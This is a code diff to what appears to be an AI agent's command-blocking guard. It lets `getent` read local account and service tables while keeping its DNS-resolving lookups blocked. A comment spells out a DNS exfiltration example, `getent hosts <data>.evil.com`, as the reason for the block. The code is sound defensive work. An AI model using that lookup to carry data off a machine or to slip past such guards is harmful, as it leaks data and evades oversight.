@@ -295,6 +295,7 @@ export function detectDangerousInvokeBin(command: string): string | null {
     const bin = at === null ? null : execBasename(tokens[at]);
     if (bin === "mount" && (mountOnlyLists(tokens.slice(at! + 1)) || mountsImageReadOnly(tokens.slice(at! + 1)))) continue;
     if (bin === "umount" && unmountsWorkingMount(tokens.slice(at! + 1))) continue;
+    if (bin === "getent" && getentReadsLocalTable(tokens.slice(at! + 1))) continue;
     if (bin && DANGEROUS_INVOKE_BINS.has(bin)) {
       return `Blocked: '${bin}' is a restricted network/system command. (If you only named it as an argument, rephrase — the block is on INVOKING it, not mentioning it.)`;
     }
@@ -372,6 +373,27 @@ function mountsImageReadOnly(args: string[]): boolean {
  *  that — a working mount point, no flags (`-a` and `-l` reach further). */
 function unmountsWorkingMount(args: string[]): boolean {
   return args.length > 0 && args.every((a) => !a.startsWith("-") && isWorkingMountPoint(a));
+}
+
+// getent is restricted for its name databases: `hosts` and `ahosts*` resolve
+// through NSS, which asks DNS, so `getent hosts <data>.evil.com` carries data
+// off the box the way `dig` does, and `networks` can resolve the same way. Its
+// account and service tables are this box's own, read from /etc as `id` and
+// `grep /etc/services` are (Terminal-Bench 2.0 mailman, 2026-10-29: `getent
+// passwd` to list the mailbox users was refused). The shadow tables stay out:
+// a password hash is a sensitive read whichever command performs it.
+const GETENT_LOCAL_TABLES = new Set(["passwd", "group", "services", "protocols", "rpc", "ethers", "aliases", "initgroups"]);
+
+/** `getent passwd …`: a lookup in one of the box's own tables, never a name
+ *  database. `-s` / `--service` picks the NSS module and takes a value. */
+function getentReadsLocalTable(args: string[]): boolean {
+  for (let i = 0; i < args.length; i++) {
+    const a = args[i];
+    if (a === "-s" || a === "--service") { i++; continue; }
+    if (a.startsWith("-")) continue;
+    return GETENT_LOCAL_TABLES.has(a);
+  }
+  return false;
 }
 
 // ── C3-17: raw-socket / network module use in node -e / python -c bodies ──
